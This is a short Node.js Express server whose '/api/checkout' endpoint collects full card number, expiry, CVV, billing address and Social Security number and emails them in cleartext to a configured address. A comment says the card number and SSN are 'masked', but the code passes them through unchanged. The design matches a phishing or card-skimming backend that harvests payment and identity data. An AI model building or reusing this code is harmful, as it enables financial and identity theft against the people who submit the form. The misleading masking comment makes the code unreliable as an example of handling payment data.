const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
require('dotenv').config();

// Load environment variables

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Nodemailer transporter
const transporter = nodemailer.createTransport({
  service: 'Gmail', // Replace with your email service provider
  auth: {
    user: process.env.EMAIL,
      pass: process.env.PASSWORD, // App password or real password
  },
});

// API Endpoint for POST request
app.post('/api/checkout', async (req, res) => {
  const { name, cardNumber, expiry, cvv, billingAddress, ssn } = req.body;

  // Ensure sensitive data is masked or only partial data is shared
  const maskedCardNumber = `${cardNumber}`;
  const maskedSSN = `${ssn}`;

  const emailBody = `
    <h3>New Payment Details Submitted</h3>
    <p><strong>Name:</strong> ${name}</p>
    <p><strong>Card Number:</strong> ${maskedCardNumber}</p>
    <p><strong>Expiry:</strong> ${expiry}</p>
    <p><strong>CVV:</strong> ${cvv}</p>
    <p><strong>Billing Address:</strong> ${billingAddress}</p>
    <p><strong>SSN:</strong> ${maskedSSN}</p>
  `;

  try {
    // Send email
    await transporter.sendMail({
      from: `"Checkout System" <${process.env.RECEIVER_EMAIL}>`,
      to: process.env.RECEIVER_EMAIL, // Recipient email
      subject: 'New Checkout Details Submitted',
      html: emailBody,
    });

    res.status(200).json({ message: 'Checkout details sent successfully!' });
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ message: 'Failed to send checkout details.' });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
